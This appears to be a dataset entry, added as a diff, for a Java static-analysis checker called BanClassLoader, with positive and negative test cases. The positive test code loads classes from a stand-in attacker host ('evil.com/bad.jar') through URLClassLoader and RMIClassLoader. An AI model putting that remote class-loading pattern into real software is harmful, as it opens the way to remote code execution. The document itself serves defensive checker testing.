@@ -1,0 +1,30 @@
+{
+  "name": "BanClassLoader",
+  "language": "java",
+  "description": "Using dangerous ClassLoader APIs may deserialize untrusted user input into bytecode, leading to remote code execution vulnerabilities",
+  "example": null,
+  "cwe": null,
+  "cwe-description": null,
+  "checker-language": "java",
+  "loc": 71,
+  "branches": 1,
+  "apis": 1,
+  "test": [
+    {
+      "description": "positiveCase",
+      "expected-problems": null,
+      "expected-linenumbers": [
+        34
+      ],
+      "code": "package com.google.errorprone.bugpatterns.testdata;\n\nimport static java.rmi.server.RMIClassLoader.loadClass;\n\nimport java.lang.invoke.MethodHandles;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.net.URLClassLoader;\n\nclass BanClassLoaderPositiveCases {\n  /** Override loadClass with an insecure implementation. */\n  // BUG: Diagnostic contains: BanClassLoader\n  class InsecureClassLoader extends URLClassLoader {\n    public InsecureClassLoader() {\n      super(new URL[0]);\n    }\n\n    @Override\n    protected Class<?> loadClass(String name, boolean resolve) throws ClassNotFoundException {\n      try {\n        addURL(new URL(\"jar:https://evil.com/bad.jar\"));\n      } catch (MalformedURLException e) {\n      }\n      return findClass(name);\n    }\n  }\n\n  /** Calling static methods in java.rmi.server.RMIClassLoader. */\n  public static final Class<?> loadRMI() throws ClassNotFoundException, MalformedURLException {\n    // BUG: Diagnostic contains: BanClassLoader\n    return loadClass(\"evil.com\", \"BadClass\");\n  }\n\n  /** Calling constructor of java.net.URLClassLoader. */\n  public ClassLoader loadFromURL() throws MalformedURLException {\n    // BUG: Diagnostic contains: BanClassLoader\n    URLClassLoader loader = new URLClassLoader(new URL[] {new URL(\"jar:https://evil.com/bad.jar\")});\n    return loader;\n  }\n\n  /** Calling methods of nested class. */\n  public static final Class<?> methodHandlesDefineClass(byte[] bytes)\n      throws IllegalAccessException {\n    // BUG: Diagnostic contains: BanClassLoader\n    return MethodHandles.lookup().defineClass(bytes);\n  }\n}\\"
+    },
+    {
+      "description": "negativeCase",
+      "expected-problems": null,
+      "expected-linenumbers": [
+        91
+      ],
+      "code": "package com.google.errorprone.bugpatterns.testdata;\n\nimport java.net.URL;\nimport java.net.URLClassLoader;\nimport java.security.SecureClassLoader;\n\nclass BanClassLoaderPositiveCases {\n  /** OK to extend SecureClassLoader */\n  class AnotherSecureClassLoader extends SecureClassLoader {}\n\n  /** OK to call loadClass if it's not on RMIClassLoader */\n  public final Class<?> overrideClassLoader() throws ClassNotFoundException {\n    SecureClassLoader loader = new AnotherSecureClassLoader();\n    return loader.loadClass(\"BadClass\");\n  }\n\n  /** OK to define loadClass */\n  private class NotClassLoader {\n    protected void loadClass() {}\n  }\n}\\"
+    }
+  ]
+}
